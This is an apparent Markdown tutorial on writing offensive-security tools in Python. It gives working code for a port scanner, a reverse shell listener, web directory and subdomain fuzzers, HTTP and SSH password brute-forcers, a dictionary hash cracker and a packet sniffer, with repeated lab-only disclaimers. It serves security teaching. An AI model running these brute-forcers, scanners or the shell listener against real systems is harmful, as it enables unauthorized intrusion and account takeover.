# 🐍 PYTHON FOR HACKING
> The hackers' language. Stop just using tools: start creating them.
> Version 2.0 — BUFFED: more ready-to-use scripts.

---

## Why Python for security?
- **Fast to write:** you prototype an exploit or scanner in minutes.
- **Libraries for everything:** networking, web, crypto, parsing — one already exists.
- **It's the industry's language:** impacket, sqlmap, recon-ng... almost everything is in Python.

> The difference between someone who **uses** tools and a real hacker is that the second one **writes their own** when they don't exist.

⚠️ Everything here, ONLY against your own lab, practice machines (DVWA, HackTheBox) or with written permission.

---

## 1. Sockets — talk to the network directly

### TCP client + banner grabbing
```python
import socket

def grab_banner(host, port):
    try:
        s = socket.socket(); s.settimeout(2)
        s.connect((host, port))
        return s.recv(1024).decode(errors='ignore').strip()
    except Exception:
        return None
    finally:
        s.close()

print(grab_banner("127.0.0.1", 22))   # tells you the SSH version
```

### Multithreaded port scanner (your homemade "nmap")
```python
import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    if s.connect_ex((host, port)) == 0:
        print(f"[+] Port {port} OPEN")
    s.close()

def scan_host(host, start=1, end=1024):
    print(f"[*] Scanning {host}...")
    with ThreadPoolExecutor(max_workers=200) as ex:
        for p in range(start, end + 1):
            ex.submit(scan_port, host, p)

# scan_host("127.0.0.1")   # ONLY your own machine
```
In 30 lines, a multithreaded scanner. That's the power of Python.

### Reverse shell listener (receive a shell)
```python
import socket

def listener(port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port)); s.listen(1)
    print(f"[*] Listening on {port}...")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")
    while True:
        cmd = input("shell> ")
        if cmd == "exit": break
        conn.send(cmd.encode() + b"\n")
        print(conn.recv(4096).decode(errors='ignore'))

# listener()   # homemade equivalent of 'nc -lvnp 4444'
```

---

## 2. Web with `requests`

```python
import requests

r = requests.get("http://example.com")
print(r.status_code, r.headers.get('Server'))

# With a session (keeps cookies between requests)
s = requests.Session()
s.post("http://target/login", data={"user": "admin", "pass": "123"})
r = s.get("http://target/panel")   # already logged in
```

### Directory fuzzer (your mini-gobuster)
```python
import requests
from concurrent.futures import ThreadPoolExecutor

def test(base, path):
    url = f"{base}/{path.strip()}"
    try:
        r = requests.get(url, timeout=3)
        if r.status_code != 404:
            print(f"[{r.status_code}] {url}")
    except Exception: pass

def fuzz(base, wordlist):
    with open(wordlist, encoding='latin-1') as f, ThreadPoolExecutor(max_workers=50) as ex:
        for line in f:
            ex.submit(test, base, line)

# fuzz("http://localhost:8080", "/usr/share/wordlists/dirb/common.txt")
```

### Subdomain finder (your mini-subfinder)
```python
import requests
from concurrent.futures import ThreadPoolExecutor

def test_sub(domain, sub):
    url = f"http://{sub.strip()}.{domain}"
    try:
        requests.get(url, timeout=2)
        print(f"[+] {url}")
    except Exception: pass

def find_subs(domain, wordlist):
    with open(wordlist) as f, ThreadPoolExecutor(max_workers=50) as ex:
        for sub in f:
            ex.submit(test_sub, domain, sub)

# find_subs("example.com", "subdomains.txt")
```

---

## 3. Brute force (educational concept)

```python
import requests

def brute_login(url, user, wordlist):
    for line in open(wordlist, encoding='latin-1'):
        pwd = line.strip()
        r = requests.post(url, data={"username": user, "password": pwd})
        if "incorrect" not in r.text.lower():   # adjust to the real text
            print(f"[+] FOUND! {user}:{pwd}")
            return pwd
    print("[-] Not found")

# ONLY against YOUR lab (DVWA, etc.)
```
**This illustrates why rate limits, CAPTCHA and 2FA exist** — without them, a weak login falls in seconds.

### SSH brute with paramiko
```python
import paramiko   # pip install paramiko

def ssh_brute(host, user, wordlist):
    for line in open(wordlist, encoding='latin-1'):
        pwd = line.strip()
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            cli.connect(host, username=user, password=pwd, timeout=3)
            print(f"[+] SUCCESS! {user}:{pwd}"); return pwd
        except paramiko.AuthenticationException:
            pass
        except Exception:
            pass
        finally:
            cli.close()

# ONLY on YOUR lab
```

---

## 4. Parsing and processing

### Regex — extract info (emails, IPs, hashes)
```python
import re
text = "Contact: juan@company.com, phone 555-1234, IP 192.168.1.1"
print(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', text))           # emails
print(re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', text))        # IPs
print(re.findall(r'\b[a-f0-9]{32}\b', text))                   # MD5 hashes
```

### Scraping with BeautifulSoup
```python
import requests
from bs4 import BeautifulSoup   # pip install beautifulsoup4

soup = BeautifulSoup(requests.get("http://example.com").text, 'html.parser')
for a in soup.find_all('a'):       print(a.get('href'))      # links
for f in soup.find_all('form'):    print(f.get('action'))    # forms (attack points)
```

---

## 5. Crypto with Python

```python
import hashlib

# Crack a hash by dictionary (the john/hashcat concept)
def crack(target_hash, wordlist, algo='md5'):
    for line in open(wordlist, encoding='latin-1'):
        word = line.strip()
        if hashlib.new(algo, word.encode()).hexdigest() == target_hash:
            return word
    return None

# crack("5f4dcc3b5aa765d61d8327deb882cf99", "/opt/wordlists/rockyou.txt")
# ↑ that hash is "password"
```

### Real encryption with `cryptography`
```python
from cryptography.fernet import Fernet   # pip install cryptography
key = Fernet.generate_key(); f = Fernet(key)
encrypted = f.encrypt(b"secret message")
print(f.decrypt(encrypted).decode())
```

---

## 6. Sniffing and packet manipulation with scapy

```python
from scapy.all import sniff, ARP, Ether, srp   # pip install scapy

# Sniffer in 3 lines
sniff(prn=lambda p: print(p.summary()), count=10)   # requires sudo

# ARP scan of your local network (discover devices)
def arp_scan(net):   # e.g. "192.168.1.0/24"
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net), timeout=2, verbose=0)
    for _, r in ans:
        print(f"{r.psrc}  →  {r.hwsrc}")

# arp_scan("192.168.1.0/24")   # ONLY your network (requires sudo)
```

---

## 7. Security libraries you should know

| Library | For what |
|---------|----------|
| **scapy** | Create/manipulate network packets (sniffing, spoofing, scanning). |
| **requests** | HTTP/API requests. |
| **beautifulsoup4** | Parse HTML (scraping). |
| **paramiko** | SSH from Python. |
| **impacket** | Windows network protocols (SMB, etc.) — key in AD pentesting. |
| **pwntools** | The framework for exploiting and CTFs (binary exploitation). |
| **cryptography** | Serious encryption. |
| **python-nmap** | Control nmap from Python. |
| **shodan** | Shodan API from Python. |
| **dnspython** | Programmatic DNS queries. |
| **scrapling / playwright** | Scraping with anti-detection. |

---

## 8. The structure of a professional tool

```python
#!/usr/bin/env python3
"""My scanner - description."""
import argparse, sys

def main():
    p = argparse.ArgumentParser(description="My port scanner")
    p.add_argument("target", help="IP or domain")
    p.add_argument("-p", "--ports", default="1-1024", help="port range")
    p.add_argument("-t", "--threads", type=int, default=100)
    args = p.parse_args()
    try:
        # your logic here
        pass
    except KeyboardInterrupt:
        print("\n[!] Cancelled"); sys.exit(0)

if __name__ == "__main__":
    main()
```
`argparse` gives you `-h` and professional arguments for free. That's how real tools are made.

---

## 🎓 To practice
- **Rewrite tools you already use:** your scanner, your fuzzer, your subdomain finder. Understanding inside = mastering.
- **pwntools + picoCTF** → binary exploitation.
- **"Black Hat Python"** and **"Violent Python"** → the classic books on the topic.
- **Continue with:** `book-networking.md` (to understand sockets) and `book-web-hacking.md` (automate the attacks).

> ⬛ *Tools make you a user. Code makes you a hacker. Start writing your own.*
